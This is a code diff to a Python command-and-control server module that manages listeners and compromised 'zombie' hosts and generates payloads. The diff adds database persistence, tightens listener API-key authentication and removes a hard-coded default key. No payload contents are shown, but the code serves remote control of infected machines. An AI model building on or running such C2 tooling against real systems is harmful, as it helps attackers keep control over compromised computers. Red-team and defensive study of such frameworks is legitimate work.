@@ -7,7 +7,17 @@ import re
 C2_MAGIC = b"YGG!"
 LISTENERS = {}
 ZOMBIES = {}
-C2_LOCK = threading.Lock()
+C2_LOCK = threading.RLock()
+
+# Best-effort persistence import — never fail if DB is unavailable
+try:
+    from yggapp.repositories.c2_repository import (
+        persist_listener, load_all_listeners, delete_listener,
+        persist_zombie, update_zombie_status,
+    )
+    _PERSISTENCE_AVAILABLE = True
+except ImportError:
+    _PERSISTENCE_AVAILABLE = False
 
 # -- Validation helpers ---------------------------------------------------
 
@@ -91,6 +101,12 @@ def start_listener(port, bind_addr="0.0.0.0", name="Default Listener", auth_enab
 
     with C2_LOCK:
         LISTENERS[listener_id] = listener
+
+    if _PERSISTENCE_AVAILABLE:
+        try:
+            persist_listener(listener_id, listener)
+        except Exception:
+            pass
 
     thread = threading.Thread(target=_accept_loop, args=(listener_id,), daemon=True)
     thread.start()
@@ -231,6 +247,12 @@ def _disconnect_zombie(zombie_id):
                 LISTENERS[lid]["zombies"].remove(zombie_id)
         saved_addr = zom.get("addr", "unknown")
 
+    if _PERSISTENCE_AVAILABLE:
+        try:
+            update_zombie_status(zombie_id, "disconnected")
+        except Exception:
+            pass
+
     try:
         from handlers.team_server import notify_zombie_disconnected
         notify_zombie_disconnected(zombie_id, saved_addr)
@@ -261,7 +283,16 @@ def _accept_loop(listener_id):
             break
 
         auth_enabled = listener.get("auth_enabled", True)
-        api_key = listener.get("api_key", "YGG!")
+        api_key = listener.get("api_key", "")
+        if auth_enabled and not api_key:
+            try:
+                client_sock.sendall(b"REJECTED\n")
+                client_sock.close()
+            except Exception:
+                pass
+            with C2_LOCK:
+                listener["total_connections"] += 1
+            continue
 
         if auth_enabled:
             try:
@@ -300,6 +331,12 @@ def _accept_loop(listener_id):
             ZOMBIES[zombie_id] = zombie
             listener["zombies"].append(zombie_id)
             listener["total_connections"] += 1
+
+        if _PERSISTENCE_AVAILABLE:
+            try:
+                persist_zombie(zombie_id, zombie)
+            except Exception:
+                pass
 
         ts = time.time()
         zombie["output"].append({
@@ -537,13 +574,14 @@ def generate_payload(listener_ip, listener_port, payload_type="python", arch="x6
     listener_port = int(listener_port)
 
     if not api_key:
-        api_key = "YGG!"
         with C2_LOCK:
             for lst in LISTENERS.values():
                 if lst["port"] == listener_port and lst["status"] == "running":
                     if lst.get("api_key"):
                         api_key = lst["api_key"]
                     break
+        if not api_key:
+            return {"status": "error", "message": "No API key provided and no matching running listener found. Provide an api_key or start a listener with authentication."}
     api_key = _sanitize_api_key(api_key)
 
     payloads = {
